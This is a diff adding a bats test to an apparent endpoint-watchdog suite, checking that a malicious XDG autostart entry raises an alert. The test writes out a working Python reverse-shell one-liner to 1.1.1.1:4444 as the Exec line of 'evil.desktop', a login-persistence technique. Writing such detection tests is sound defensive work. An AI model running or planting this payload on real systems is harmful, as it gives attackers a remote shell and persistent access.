@@ -291,3 +291,15 @@ cap() { cat "${SELFDEF_TEST_LOGCAP}"; }
     run_wd
     cap | grep -qE '"severity":"(alert|warn)"'
 }
+
+@test "INVARIANT (python -c reverse-shell variant — interpreter-rev-shell axis on XDG autostart surface)" {
+    # Sister to nc / curl|bash / dev-tcp XDG autostart variants.
+    # Python on every Debian/Ubuntu desktop. Locks python axis on
+    # T1547.013 XDG Autostart per-graphical-login persistence.
+    printf '[Desktop Entry]\nType=Application\nExec=/usr/bin/gnome-keyring\n' > "${AUTOD}/benign.desktop"
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '[Desktop Entry]\nType=Application\nExec=python -c "import socket,os,pty;s=socket.socket();s.connect((\\"1.1.1.1\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);pty.spawn(\\"/bin/sh\\")"\n' > "${AUTOD}/evil.desktop"
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
